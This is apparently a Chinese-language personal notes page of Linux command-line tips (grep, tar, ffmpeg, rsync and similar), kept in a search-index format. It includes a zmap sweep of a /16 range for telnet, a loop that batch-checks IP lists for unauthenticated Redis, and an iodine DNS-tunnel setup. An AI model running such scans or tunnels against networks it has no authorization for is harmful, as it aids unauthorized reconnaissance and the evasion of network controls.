$4}'` > 5\" |bc -l) )) && \\ (echo $LINE ; kill `echo ${ LINE } |awk '{print $2}'`); sleep 5; done screen\u81ea\u52a8\u64cd\u4f5c\u4ee5\u53ca\u83b7\u53d6\u5f53\u524d\u5c4f\u5e55\u5185\u5bb9 \u00b6 screen -dmS name /bin/bash screen -S name -p 0 -X stuff \"ls\"`echo -ne '\\r'` screen -S name -p 0 -X hardcopy /tmp/test.txt \u4e2d\u6587\u5b57\u7b26\u4f1a\u6709\u95ee\u9898\uff0c\u5f85\u89e3\u51b3 \u7f16\u8bd1\u5f53\u524d\u6587\u4ef6\u5939\u6240\u6709.c\u6587\u4ef6 \u00b6 ${i%.*} \u53bb\u6389\u6587\u4ef6\u540d\u7684\u6700\u540e\u4e00\u4e2a\u540e\u7f00 for i in *.c; do gcc $i -o out/ ${ i %.* } ; done gdb\u81ea\u52a8\u5316 \u00b6 echo -e \"set pagination off\\nset confirm off\" > ~/.gdbinit \u7136\u540e\u4f7f\u7528 gdb ./a.out -ex \"r inputfile\" -ex \"bt\" -ex \"quit\" mktorrent\u5236\u4f5c\u79cd\u5b50torrent\u6587\u4ef6 \u00b6 \u53c2\u8003\uff1a https://community.seedboxes.cc/articles/how-to-create-a-torrent-via-the-command-line sudo apt install mktorrent mktorrent -v -a \"http://tracker.nexushd.org/announce.php\" -p folder -o folder.torrent -l 24 \u5176\u4e2d -l 24 \u7684\u610f\u601d\u662f\u6bcf\u4e2a\u5206\u5757\u4e3a2**24=16MB\uff0c\u8fd9\u662f\u5efa\u8bae\u7684\u6700\u5927\u7684\u503c \u9489\u9489\u76f4\u64ad\u56de\u653e\u4e0b\u8f7d m3u8\u8f6cmp4 \u00b6 \u624b\u673a\u7aef\u7528\u6293\u5305\u8f6f\u4ef6 \u5982HttpCanary\uff0c\u70b9\u5f00\u76f4\u64ad\u56de\u653e\u540e\u4f1a\u5f97\u5230\u4e00\u4e2am3u8\u7684\u5730\u5740\uff0c\u7136\u540e\u4f7f\u7528ffmpeg\u4e0b\u8f7d\u5373\u53ef \u53c2\u8003\uff1ahttps://www.bilibili.com/video/av99036702/ https://gist.github.com/tzmartin/fb1f4a8e95ef5fb79596bd4719671b5d ffmpeg -i http://dtliving-pre.alicdn.com/... -bsf:a aac_adtstoasc -vcodec copy -c copy name.mp4 \u9ed1\u8272\u80cc\u666fls \u76ee\u5f55\u6df1\u7eff\u8272\u770b\u4e0d\u6e05\u6539\u4e2a\u989c\u8272 \u00b6 Ubuntu\u7cfb\u7edf\u7f16\u8f91 ~/.dircolors : (\u5176\u4ed6\u7cfb\u7edf ~/.dir_colors ) DIR 01;36 \u6216\u8005\u6267\u884c\uff1a eval `dircolors | sed -e 's/;34:/;36:/'` \u90e8\u7f72seafile\u5ba2\u6237\u7aef \u00b6 https://download.seafile.com/published/seafile-user-manual/syncing_client/install_linux_client.md \u9700\u8981\u6ce8\u610fseafile-cli\u5df2\u7ecf\u52a0\u5165boinc\u5b98\u65b9\u6e90\uff0c\u4f46\u7248\u672c\u4e0eppa\u6e90\u4e0d\u5339\u914d # apt install -y software-properties-common add-apt-repository -y ppa:seafile/seafile-client apt update apt install seafile-cli -y mkdir ~/seafile seaf-cli init -d ~/seafile seaf-cli start # \u91cd\u542f\u540e\u4e5f\u9700\u8981\u81ea\u5df1\u624b\u52a8\u542f\u52a8 \u5728\u7f51\u9875\u7aef\u521b\u5efa/\u6253\u5f00\u8d44\u6599\u5e93\u540e\u4eceurl\u590d\u5236\u5f97\u5230id \u5ba2\u6237\u7aef\u6ca1\u6709\u9700\u8981\u540c\u6b65\u7684\u6587\u4ef6\u65f6\u7528download\uff0c\u6709\u9700\u8981\u52a0\u5165\u540c\u6b65\u7684\u6570\u636e\u7528sync seaf - cli download - l \"the id of the library\" - s \"the url + port of server\" - d \"the folder which the library will be synced with\" - u \"username on server\" [ - p \"password\" ] \u767b\u5f55\u7528\u6237\u540d\u5bc6\u7801\u9519\u8bef\u7684\u65f6\u5019\u62a5\u9519\u662f400\uff0c\u9700\u8981\u7559\u610f pcregrep\u6b63\u5219\u63d0\u53d6 \u00b6 \u4f8b\u5982\u6211\u4eec\u8981\u63d0\u53d6some.htm\u4e2d\u6240\u6709href\u5c5e\u6027\u4e2d\u7684html\uff0c\u4f7f\u7528\u666e\u901a\u7684grep\u4e0d\u80fd\u53ea\u63d0\u53d6\u5355\u72ec\u7684group\u3002\u8fd9\u91cc\u6211\u4eec\u7528pcregrep\u53ef\u4ee5\u6307\u5b9a -o \u53c2\u6570\uff0c\u8fd8\u53ef\u4ee5\u591a\u6b21\u6307\u5b9a\u8fde\u7eed\u8f93\u51fa # apt install -y pcregrep pcregrep -o1 'href=\"([^\\.]*\\.htm)\"' some.htm \u7ba1\u9053\u5173\u95ed\u7f13\u51b2 \u00b6 \u53c2\u8003\uff1ahttps://harttle.land/2020/06/06/tail-f-pipe.html grep \u6dfb\u52a0 --line-buffered \uff0csed \u6dfb\u52a0 -u \uff0cawk \u8c03 fflush() \u3002 Shell \u91cc\u53ef\u4ee5\u901a\u8fc7 [ -t 1 ] \u6765\u5224\u65ad stdout\uff08\u6587\u4ef6\u63cf\u8ff0\u7b26 1\uff09 \u662f\u5426\u662f TTY\u3002 More \u4f8b\u5b50\uff1a tail -f log.txt | grep --line-buffered Error | sed -u 's/harttle//' | awk ' ${ print $ 1 ; fflush () } ' | grep ENOENT \u7b49\u5f85\u7279\u5b9a\u8fdb\u7a0b\u7ed3\u675f \u00b6 \u4f8b\u5982\u5e76\u884c\u542f\u52a8\u7f16\u8bd1\u8fdb\u7a0b\uff0c\u5e0c\u671b\u7b49\u5f85\u6240\u6709gcc\u7ed3\u675f\uff1a while [ \"`pgrep -c gcc`\" -gt 0 ]; do echo cnt: `pgrep -c gcc` sleep 10; done","title":"Linux-cli"},{"location":"Linux-cli/#linux","text":"\u672c\u6587\u6863\u4e00\u822c\u4e0d\u6d89\u53caroot\u6743\u9650\uff0cLinux\u76f8\u5173\u7b14\u8bb0\u8fd8\u6709\uff1a Linux\u7cfb\u7edf\u914d\u7f6e SSH\u8fdc\u7a0b\u767b\u5f55 Linux\u5907\u4efd","title":"Linux\u547d\u4ee4\u884c\u64cd\u4f5c\u6280\u5de7"},{"location":"Linux-cli/#_1","text":"\u5c06\u4ee5\u4e0b\u5185\u5bb9\u52a0\u5165 ~/.bashrc \u4e2d\u5373\u53ef\uff0c\u5224\u65ad\u5982\u679c\u5728\u5185\u7f6e\u547d\u4ee4\u5c31\u8c03\u7528help -m\uff0c\u4e0d\u662f\u5219\u7ed5\u5f00bash\u51fd\u6570\u6765\u8fd0\u884cman\u8fdb\u7a0b man () { case \" $( type -t -- \" $1 \" ) \" in builtin | keyword ) help -m \" $1 \" | sensible-pager ;; * ) command man \" $@ \" ;; esac }","title":"\u67e5\u770b\u5185\u7f6e\u547d\u4ee4\u7684\u5e2e\u52a9"},{"location":"Linux-cli/#grep","text":"\u7528\u4e24\u4e2a\u6a2a\u7ebf -- \u4f5c\u4e3agrep\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u4e0d\u8981\u628a\u5176\u540e\u9762\u7684\u5f62\u5982 -z \u7684\u53c2\u6570\u5f53\u6210grep\u7684\u53c2\u6570 \u4f8b\u5982\u6211\u60f3\u77e5\u9053tar\u547d\u4ee4\u4e2d\u7684-z\u662f\u4ec0\u4e48\u610f\u601d\uff1a man tar | grep -- -z","title":"grep\u641c\u7d22\u5e2e\u52a9\u6587\u6863"},{"location":"Linux-cli/#grepstderrstdout","text":"\u67d0\u4e9b\u65f6\u5019\u5e2e\u52a9\u6587\u672c\u662f\u8f93\u51fa\u5230\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u7684\uff0c\u9700\u8981\u75282>&1\u8fd9\u6837\u7684\u91cd\u5b9a\u5411\u54af ssh-keygen --help 2>&1|grep bit","title":"\u5e2e\u52a9\u6587\u672c\u7684grep\uff0c\u628astderr\u91cd\u5b9a\u5411\u5230stdout"},{"location":"Linux-cli/#_2","text":"tar.gz\uff1a tar -zxvf xx.tar.gz tar.bz2\uff1a tar -jxvf xx.tar.bz2 zip\uff1a unzip xx.zip \u53c2\u6570\u542b\u4e49\uff1a -x\u89e3\u538b\uff0c-v\u8be6\u7ec6\u663e\u793a\u89e3\u538b\u51fa\u6765\u7684\u4e1c\u897f\uff08\u5982\u679c\u662f\u4e00\u4e2a\u590d\u6742\u7684\u538b\u7f29\u5305\u5efa\u8bae\u4e0d\u8981\u7528\u4ee5\u52a0\u5feb\u89e3\u538b\u901f\u5ea6\uff09\uff0c-f\u540e\u63a5\u538b\u7f29\u6587\u4ef6\u7684\u6587\u4ef6\u540d","title":"\u5404\u79cd\u89e3\u538b\u547d\u4ee4"},{"location":"Linux-cli/#_3","text":"\u8fd9\u91cc\u8981\u641c\u7d22\u5f53\u524d\u76ee\u5f55\u4e0b\u9762\u6240\u6709\u7684\u5305\u542b\u201dMultiTeam\u201d\u6587\u4ef6 grep MultiTeam -r .","title":"\u5f53\u524d\u76ee\u5f55\u6587\u4ef6\u5168\u6587\u641c\u7d22"},{"location":"Linux-cli/#_4","text":"find \u6307\u5b9a\u6587\u4ef6\u540e\u7f00\u540d\uff0c\u8bb0\u4f4f\u8981\u5f15\u53f7\u907f\u514dbash\u89e3\u6790* find -name \"*.py\" -o -name \"*.md\"|xargs cat|wc","title":"\u7edf\u8ba1\u5f53\u524d\u6587\u4ef6\u5939\u4ee3\u7801\u884c\u6570"},{"location":"Linux-cli/#_5","text":"\u7528xargs -d\u6307\u5b9a\u5206\u9694\u7b26\u4e3a\\n\uff08\u9ed8\u8ba4\u4f1a\u6309\u7167\u7a7a\u683c\u548c\\n\u5206\u9694\u53c2\u6570\uff09 cat list.txt | xargs -d \"\\n\" ls -alh","title":"\u67e5\u770b\u7ed9\u5b9a\u6587\u4ef6\u5217\u8868\u7684\u6587\u4ef6\u5927\u5c0f"},{"location":"Linux-cli/#wget","text":"wget -i list.txt -nc --wait=60 --random-wait \u5176\u4e2dnc\u8868\u793a\u5df2\u7ecf\u4e0b\u8f7d\u5230\u7684\u6587\u4ef6\u5c31\u4e0d\u8981\u518d\u8bf7\u6c42\u4e86\uff0cwait=60\u8868\u793a\u4e24\u6b21\u8bf7\u6c42\u95f4\u969460s\uff0crandom-wait\u8868\u793a\u968f\u673a\u7b49\u5f852~120s","title":"wget\u6162\u6162\u4e0b\u8f7d"},{"location":"Linux-cli/#touch","text":"\u5c06b.txt\u7684\u65f6\u95f4\u6233\u6539\u4e3a\u548ca.txt\u4e00\u6837 touch -r a.txt b.txt","title":"touch\u4fee\u6539\u65f6\u95f4\u6233"},{"location":"Linux-cli/#ubuntuls","text":"unalias ls \u6216\u8005\u76f4\u63a5\u4f7f\u7528\uff1aCredits @rachpt \\ls \u540c\u7406\u4e5f\u53ef\u4ee5\u7ed5\u8fc7grep\u7684alias: \\grep","title":"\u53bb\u6389Ubuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0bls\u7684\u989c\u8272"},{"location":"Linux-cli/#_6","text":"\u5982\u679c\u4e00\u4e2a\u6587\u4ef6\u6765\u81ea\u4e8eWindows\uff0c\u53ef\u80fd\u9700\u8981\u5148\u4fee\u6539\u6362\u884c\u65b9\u5f0f\u624d\u80fd\u7528\uff0c\u53bb\u6389\u6587\u4ef6\u4e2d\u7684\\r vim\u4e2d\u8f93\u5165 :set ff=unix","title":"\u6362\u884c\u65b9\u5f0f\u4fee\u6539"},{"location":"Linux-cli/#iodine-dns","text":"http://code.kryo.se/iodine/ \u6ce8\u610f\uff1a \u672c\u65b9\u6848\u7f51\u901f\u6781\u4f4e\uff0c\u4f7f\u7528\u65f6\u8981\u6709\u8db3\u591f\u7684\u8010\u5fc3\uff0c\u4e0d\u80fd\u4fdd\u8bc1\u590d\u6742\u60c5\u51b5\u4e0b\u662f\u5426\u53ef\u884c\uff08\u5c24\u5176\u662fWindows\uff09 \u524d\u671f\u51c6\u5907\uff1a\u4e00\u4e2a\u57df\u540d\uff08\u5047\u8bbe\u4e3aexample.com\uff09\u53ca\u4e00\u53f0\u670d\u52a1\u5668\uff08\u5047\u8bbe\u4e3a1.2.3.4\uff09\uff0c\u5efa\u8bae\u5ba2\u6237\u7aef\u5728Linux\u4e0a\u8fd0\u884c","title":"iodine--\u4f7f\u7528DNS\u4f20\u8f93\u6570\u636e"},{"location":"Linux-cli/#1","text":"dns.example.com\u6dfb\u52a0\u4e00\u6761A\u8bb0\u5f55\uff0c\u89e3\u6790\u81f31.2.3.4 t.example.com\u6dfb\u52a0\u4e00\u6761NS\u8bb0\u5f55\uff0c\u503c\u4e3adns.example.com","title":"1. \u8bbe\u7f6e\u57df\u540d\u89e3\u6790"},{"location":"Linux-cli/#2","text":"./iodined -f -c -P secretpassword 192.168.99.1 t.example.com -f\u8868\u793a\u6301\u7eed\u5360\u7528\u524d\u53f0\uff0c-c\u8868\u793a\u4e0d\u9650\u5236\u8bf7\u6c42\u6e90\uff0c-P\u6307\u5b9a\u5bc6\u7801\uff0c\u6700\u540e\u662f \u5185\u7f51IP \u548c\u4f7f\u7528\u7684\u57df\u540d \u5185\u7f51IP\u53ef\u4ee5\u968f\u610f\u6307\u5b9a\uff0c\u53ea\u8981\u5f53\u524d\u670d\u52a1\u5668\u6ca1\u6709\u5360\u7528\u5373\u53ef\uff0c\u4f8b\u5982\u53ef\u4ee5\u6539\u4e3a172.16.0.1","title":"2. \u670d\u52a1\u5668\u7aef"},{"location":"Linux-cli/#3","text":"http://code.kryo.se/iodine/check-it/ \u4f5c\u8005\u63d0\u4f9b\u4e86\u5728\u7ebf\u68c0\u67e5\u5de5\u5177\uff0c\u8f93\u5165t.example.com\u5373\u53ef\u68c0\u67e5","title":"3.\u68c0\u67e5\u670d\u52a1\u7aef\u662f\u5426\u6b63\u5e38"},{"location":"Linux-cli/#4","text":"\u5efa\u8bae\u5728ubuntu\u7b49\u5b8c\u6574\u7684Linux\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u8fd0\u884c\uff0c\u4e0b\u8f7d\u6e90\u7801\u540emake\u5373\u53ef ./iodine -f -P secretpassword t.example.com \u6548\u679c\u56fe\uff1a","title":"4.\u5ba2\u6237\u7aef"},{"location":"Linux-cli/#windows","text":"Windows\u4e0b\u6709\u81ea\u5e26\u7684mstsc\uff0cLinux\u5982\u6811\u8393\u6d3e\u7528\u5565\u5462\uff1f\u5c31\u7528 rdesktop \u5566 \u624b\u518c\u67e5\u8be2\u7528 man rdesktop \u5feb\u901f\u4f7f\u7528\uff1a sudo apt-get install -y rdesktop rdesktop -f -k en-us -C -N -z -xl -P -u \u7528\u6237\u540d -p \u5bc6\u7801 \u670d\u52a1\u5668\u5730\u5740:\u7aef\u53e3 \u5176\u4e2d-f\u8868\u793a\u5168\u5c4f\uff0c -k\u8bbe\u7f6e\u952e\u76d8\u5e03\u5c40\uff0c -C\u4f7f\u7528\u79c1\u6709\u989c\u8272\u8868\uff0c-N\u540c\u6b65NumLock\uff0c-z\u542f\u7528\u538b\u7f29\uff0c-xl \u8bbe\u7f6e\u4e3aLAN\u573a\u666f\uff0c-P\u4f7f\u7528bitmap\u7f13\u5b58 \u6ce8\u610f\u4e0a\u8ff0\u5728\u547d\u4ee4\u884c\u4e2d\u4f7f\u7528\u660e\u6587\u5bc6\u7801\u5e76\u4e0d\u5b89\u5168\uff0c\u53ef\u80fd\u88ab\u5176\u4ed6\u7528\u6237\u7528ps\u7b49\u5de5\u5177\u770b\u5230\uff0c\u5efa\u8bae\u4ec5\u4ec5\u5728\u5b8c\u5168\u81ea\u5df1\u63a7\u5236\u7684Linux\u4e0a\u7cfb\u7edf\u4e0a\u8fd9\u6837\u64cd\u4f5c","title":"\u8fdc\u7a0b\u63a7\u5236Windows"},{"location":"Linux-cli/#_7","text":"awk\u662f\u4e2a\u5f88\u597d\u7528\u7684\u5de5\u5177\u5462\uff0c\u652f\u6301substr\u51fd\u6570\uff0c\u7528\u6cd5\u4e3asubstr(\u6e90\u5b57\u7b26\u4e32\uff0c\u5f00\u59cb\uff0c\u957f\u5ea6)\uff0c\u5176\u4e2d\u5f00\u59cb\u4ece1\u8ba1\u6570 ls -l \u957f\u5217\u8868\u663e\u793a\u7684\u8bdd\uff0c\u6309\u7a7a\u683c\u5206\u5c31\u662f$9 ls -l|awk '{if(substr($9,1,\u5b57\u7b26\u4e32\u957f\u5ea6)==\"\u4f60\u8981\u7684\u90a3\u4e2a\u5b57\u7b26\u4e32\") print $9}'|sort|uniq|wc -l","title":"\u7edf\u8ba1\u4ee5\u7279\u5b9a\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u6587\u4ef6\u6570\u76ee"},{"location":"Linux-cli/#hexdump","text":"echo\u7684-n\u53c2\u6570\u8868\u793a\u4e0d\u8981\u672b\u5c3e\u52a0\\n echo -n hello | hexdump -C","title":"hexdump\u67e5\u770b\u5b57\u7b26\u5185\u90e8\u7f16\u7801"},{"location":"Linux-cli/#_8","text":"sort\u7684-h\u8868\u793a\u6309\u4eba\u7c7b\u7406\u89e3\u7684\u5927\u5c0f\u683c\u5f0f\u6392\u5e8f\uff0c-r\u8868\u793a\u9006\u5e8f du -sh * | sort -hr","title":"\u5b50\u76ee\u5f55\u5927\u5c0f\u6392\u5e8f"},{"location":"Linux-cli/#ffmpeg","text":"\u5728ubuntu14\u4e0b\u662f\u6ca1\u6709ffmpeg\u7684\u5b98\u65b9\u5305\u652f\u6301\u7684\uff0c\u9700\u8981\u6dfb\u52a0mc3man\u7684ppa sudo add-apt-repository ppa:mc3man/trusty-media #\u6309\u56de\u8f66\u7ee7\u7eed sudo apt-get update sudo apt-get install -y ffmpeg","title":"\u5b89\u88c5ffmpeg"},{"location":"Linux-cli/#set-ex","text":"set \u547d\u4ee4\u633a\u6709\u7528\u7684\u5462\uff0c-e\u8868\u793a\u5982\u679c\u540e\u9762\u7684\u8bed\u53e5\u8fd4\u56de\u4e0d\u4e3a0\u7acb\u523b\u7ed3\u675fshell\uff0c-x\u8868\u793a\u663e\u793a\u51fa\u6bcf\u6761\u547d\u4ee4\u53ca\u53c2\u6570 \u4ece \u4eba\u5bb6\u7684Dockerfile \u4e2d\u5b66\u4e60\u5f97\u6765","title":"\u4fdd\u8bc1\u811a\u672c\u5b89\u5168\u6267\u884cset -ex"},{"location":"Linux-cli/#change-readonly-bash-variable","text":"bash is a weird thing\u2026 declaring a variable as reference by using declare -n , we can change it! $ a = 1 $ readonly a $ a = 2 bash: a: readonly variable #Look here! $ declare -n a $ a = 2 $ echo $a 2","title":"change readonly bash variable"},{"location":"Linux-cli/#sleep-infinity","text":"\u6709\u65f6\u5199\u4e86\u4e00\u4e2ash\u6587\u4ef6\u540e\u9700\u8981\u4fdd\u6301\u8fd9\u4e2ash\u7684\u8fd0\u884c\uff0c\u5c31\u7528sleep\u6c38\u4e45\u7b49\u5f85\u597d\u54af sleep infinity","title":"\u6c38\u4e45\u7b49\u5f85 sleep infinity"},{"location":"Linux-cli/#zmap","text":"zmap\u7684\u8fd0\u884c\u9700\u8981root\u6743\u9650\uff0c\u7528 apt-get install zmap \u5373\u53ef\u5b89\u88c5 \u66f4\u8be6\u7ec6\u7684\u5e2e\u52a9\u53bb\u770b\u770b zmap --help \u54af #\u9700\u8981\u5148\u7f16\u8f91\u9ed1\u540d\u5355 vi /etc/zmap/blacklist.conf \u53d6\u6d88\u6389\u6ce8\u91ca zmap 192.168.0.0/16 -B1000M -i eth0 -g -T 4 -p 23 -o 23.txt \u5176\u4e2d -g \u8868\u793a\u626b\u63cf\u7ed3\u675f\u540e\u663e\u793a\u603b\u7ed3\uff0c -T 4 \u8868\u793a\u542f\u52a84\u4e2a\u626b\u63cf\u7ebf\u7a0b\uff0c -p 23 \u8868\u793a\u626b\u63cf23\u7aef\u53e3\uff0c-o\u4fdd\u5b58\u6587\u4ef6\u7684\u540d\u79f0 \u5982\u679c\u62e8\u53f7\u4e86vpn\uff0c\u9700\u8981\u7528-G\u6307\u5b9a\u7f51\u5173\u7684MAC\u5730\u5740\uff0c\u53ef\u4ee5\u901a\u8fc7 arp \u7f51\u5173\u7684IP \u5f97\u5230","title":"zmap\u626b\u63cf\u6574\u4e2a\u7f51\u6bb5\u7279\u5b9a\u5f00\u653e\u7aef\u53e3"},{"location":"Linux-cli/#ipredis","text":"for i in `cat iplist.txt`; do (if [ `echo PING|redis-cli -h $i` == \"PONG\" ] ;then echo $i;fi);done 2>/dev/null \u5229\u7528\u4e86bash\u652f\u6301\u7684for\u8bed\u53e5\uff0c\u6ce8\u610ffor\u4e4b\u540e\u7684\u5206\u53f7\u548c\u6700\u540e\u7684done \u8fd8\u6709\u7528\u4e86if\u5b57\u7b26\u4e32\u76f8\u7b49\uff0c\u8bb0\u5f97\u8981\u7528fi\u7ed3\u675fif redis-cli\u8fde\u63a5\u4e0a\u670d\u52a1\u5668\u540e\u53d1\u9001PING\uff0c\u5982\u679c\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5219\u4f1a\u8fd4\u56dePONG\uff0c\u5426\u5219\u4f1a\u8981\u6c42Auth\u6216\u8005\u5176\u4ed6\u62a5\u9519\u4fe1\u606f","title":"\u5bf9ip\u5217\u8868\u6279\u91cf\u6d4b\u8bd5redis\u672a\u6388\u6743\u6f0f\u6d1e"},{"location":"Linux-cli/#imagemagick","text":"\u5b89\u88c5\u547d\u4ee4\uff1a sudo apt-get install -y imagemagick \u5904\u7406\u4e00\u5f20\u56fe\u7247in.png\uff0c\u88c1\u526a\u6210300x280\u5927\u5c0f\uff0c\u4ece(30,0)\u4f5c\u4e3a\u88c1\u526a\u7684\u5de6\u4e0a\u89d2\u70b9\uff0c\u5f97\u5230out.png\uff1a convert in.png -crop 300x280+30+0 out.png \u5176\u5b9e\u8fd9\u56db\u4e2a\u53c2\u6570\u662f\u6211\u53cd\u590d\u5c1d\u8bd5\u4e8c\u5206\u6cd5\u5f97\u5230\u7684\uff0c\u6216\u8bb8\u53ef\u4ee5\u7528\u4e13\u4e1a\u8f6f\u4ef6\u5feb\u901f\u5f97\u5230\u5427 \u5173\u952e\u662f\u53ef\u4ee5\u6279\u91cf\u5904\u7406\u5440\uff0c\u8fd9\u91cc\u4e0b\u8f7dfriends\u7684\u5934\u50cf\u56fe\u7247\u8fdb\u884c\u5904\u7406\uff1a for i in { 1. . 79 }; do curl - o $ i . png http : // kemono - friends . jp / wp - content / uploads / 2016 / 11 / no ` printf \" %03d \" $ i ` . png -- proxy socks5 : // 127.0 . 0.1 : 1080 ; done for i in { 1. . 79 }; do convert $ i . png - crop 300 x280 + 30 + 0 $ i . png ; done \u5176\u4e2d\u4f7f\u7528\u4e86printf\u547d\u4ee4\uff0c\u53ef\u4ee5\u4f7f\u5f971\u53d8\u6210\u4eba\u5bb6url\u9700\u8981\u7684001","title":"\u4f7f\u7528ImageMagick\u5bf9\u56fe\u50cf\u8fdb\u884c\u88c1\u526a"},{"location":"Linux-cli/#0","text":"find . -size 0 -delete \u67e5\u627e\u5927\u4e8e100M\u7684\u6587\u4ef6\uff1a find . -size +100M","title":"\u67e5\u627e0\u5b57\u8282\u7684\u6587\u4ef6\u5e76\u5220\u9664"},{"location":"Linux-cli/#_9","text":"\u5c06\u5f53\u524d\u76ee\u5f55\u4e0b(\u5305\u542b\u5b50\u76ee\u5f55)\u6240\u6709\u7684txt\u6587\u4ef6\u6539\u4e3a.newext\u540e\u7f00\uff1a find . -name \"*.txt\" -exec rename 's/.txt$/.newext/' {} \\; \u5982\u679ccurl\u4e0b\u8f7d\u7684\u65f6\u5019\u5141\u8bb8gzip\u4f46\u5fd8\u4e86\u2013compressed\u5f97\u5230\u7684\u6587\u4ef6\u662fgzip\u538b\u7f29\u7684\uff0c\u4fee\u6539\u5f53\u524d\u6587\u4ef6\u5939\u6240\u6709.txt\u4e3a.txt.gz\uff0c\u7136\u540e\u89e3\u538b\u7f29\uff1a\u5176\u4e2drename -v\u8868\u793a\u663e\u793a\u4fee\u6539\u7684\u5217\u8868 rename -v 's/.txt$/.txt.gz/' *.txt gunzip *.gz","title":"\u6279\u91cf\u4fee\u6539\u6587\u4ef6\u540e\u7f00\u540d"},{"location":"Linux-cli/#vimr","text":"\u7528vim\u6253\u5f00\u6587\u4ef6\u540e\uff0c\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\uff0c\u5192\u53f7\u4e5f\u662f\u9700\u8981\u6309\u7684 :set ff=unix :wq","title":"\u7528vim\u53bb\u9664\\r\u6362\u884c\u7b26"},{"location":"Linux-cli/#free","text":"\u5728docker\u5bb9\u5668\u5185\u90e8\u4e00\u822c\u662f\u4e0d\u80fd\u901a\u8fc7 free -h \u6765\u67e5\u770b\u771f\u5b9e\u5360\u7528\u7684\u5185\u5b58\u7684\uff0c\u8fd9\u65f6\u5019\u53ef\u4ee5\u91c7\u7528 ps aux \u7d2f\u52a0RSS\u5b57\u6bb5\u6765\u4f30\u8ba1\uff1a ps aux | awk '{sum+=$6} END {print sum / 1024}'","title":"\u4e0d\u7528free\u67e5\u770b\u5185\u5b58\u5360\u7528"},{"location":"Linux-cli/#watch","text":"\u4f8b\u5982\u6211\u60f3\u6301\u7eed\u67e5\u770boutput.txt\u6587\u4ef6\u5927\u5c0f\uff1a watch -n 1 ls -l output.txt \u5176\u4e2d -n 1 \u8868\u793a\u6bcf\u96941s\u5237\u65b0\u4e00\u6b21 \u8fd9\u4e2a\u547d\u4ee4\u7b49\u4ef7\u4e8e\u81ea\u5df1\u5199\u4e2abash\u811a\u672c\uff1a 1 2 3 4 5 6 7 #! /bin/bash while [ 1 ] do # do your work here... sleep 1 clear done","title":"watch\u6301\u7eed\u89c2\u5bdf\u547d\u4ee4\u8f93\u51fa"},{"location":"Linux-cli/#2truecrypt-71amake-j5-l4","text":"\u53c2\u7167 http://davidstutz.de/installing-truecrypt-raspbian/ \uff0c\u4e00\u6b65\u6b65\u6765\u5c31\u884c\u5566 \u5177\u4f53\u6b65\u9aa4\u5982\u4e0b\uff0c\u5176\u4e2dmake\u4f7f\u7528\u53c2\u6570 -j5 -l4 \u8868\u793a\u540c\u65f6\u6267\u884c5\u4e2a\u7f16\u8bd1\u4f46\u9650\u5236\u7cfb\u7edf\u8d1f\u8f7d<4\uff08\u56e0\u4e3a\u7f16\u8bd1\u8fc7\u7a0b\u5f88\u6162\uff0c\u76f4\u63a5make\u53ea\u4f1a\u4f7f\u75281\u4e2aCPU\uff0c\u8fd9\u6837\u8bbe\u7f6e\u540e\u53ef\u4ee5\u5145\u5206\u5229\u7528\u6811\u8393\u6d3e4\u6838\u5fc3CPU\uff09\uff1a \u6d89\u53ca\u7684\u538b\u7f29\u5305 truecrypt-targz.zip \uff0c wxWidgets-2.8.11.zip \uff0c pkcs.zip apt - get install - y unzip build - essentials pkg - config gtk2 . 0 - dev libfuse - dev #\u7528unzip\u89e3\u538b\u538b\u7f29\u5305\uff0c\u90fd\u89e3\u538b\u5230/root\u4e0b\uff0c\u76ee\u5f55\u7ed3\u6784\uff1a # /root # | - truecrypt-targz # | - wxWidgets-2.8.11 # | - pkcs cd wxWidgets - 2.8 . 11 ./ configure make - j5 - l4 #\u7279\u522b\u6162\uff0c\u8010\u5fc3\u7b49\u5f85 make - j5 - l4 install cd ../ truecrypt - targz export PKCS11_INC =/ root / pkcs / make - j5 - l4 NOGUI = 1 WX_ROOT =/ root / wxWidgets - 2.8 . 11 wxbuild make - j5 - l4 NOGUI = 1 WXSTATIC = 1 Main / truecrypt -- version #\u8f93\u51faTrueCrypt 7.1a cp Main / truecrypt / usr / local / bin / \u4f60\u4e5f\u53ef\u4ee5\u4e0b\u8f7d\u6211\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u7248\u672c truecrypt-armv7l","title":"\u6811\u8393\u6d3e2\u4e0a\u7f16\u8bd1Truecrypt 7.1a\uff0c\u4f7f\u7528make -j5 -l4\u52a0\u901f\u7f16\u8bd1"},{"location":"Linux-cli/#scp","text":"\u6b63\u5728\u62f7\u8d1d\u76ee\u5f55\u7684\u65f6\u5019\u88ab\u4e2d\u65ad\u4e86\uff08\u4f8b\u5982mount.ntfs\u5361\u6b7b\uff09\uff0c\u800cscp\u4e0d\u80fd\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\u3001\u53ea\u4f1a\u8986\u76d6\uff1b\u5982\u679c\u7528rsync\u5b8c\u5168\u65ad\u70b9\u7eed\u4f20\u4f3c\u4e4e\u4f1a\u6821\u9a8c\u6587\u4ef6\uff0c\u592a\u6162 \u65b9\u6cd5\u662f\uff1a\u5220\u6389\u4e2d\u65ad\u65f6\u6b63\u5728\u62f7\u8d1d\u7684\u4e0d\u5b8c\u6574\u6587\u4ef6\uff0c\u4f7f\u7528\u4e0b\u8ff0\u547d\u4ee4\u6765\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\uff1a \u5047\u8bbe\u8981\u628a\u8fdc\u7a0b\u76ee\u5f55/path/\u8fd9\u4e2a\u6587\u4ef6\u5939\u6574\u4e2a\u62f7\u8d1d\u5230/mnt/\u4e0b\uff08\u4e5f\u5c31\u662f\u5185\u5bb9\u62f7\u8d1d\u5230/mnt/path/\u4e0b\uff09 rsync --progress -v -au username@host:\"'/path'\" /mnt/ 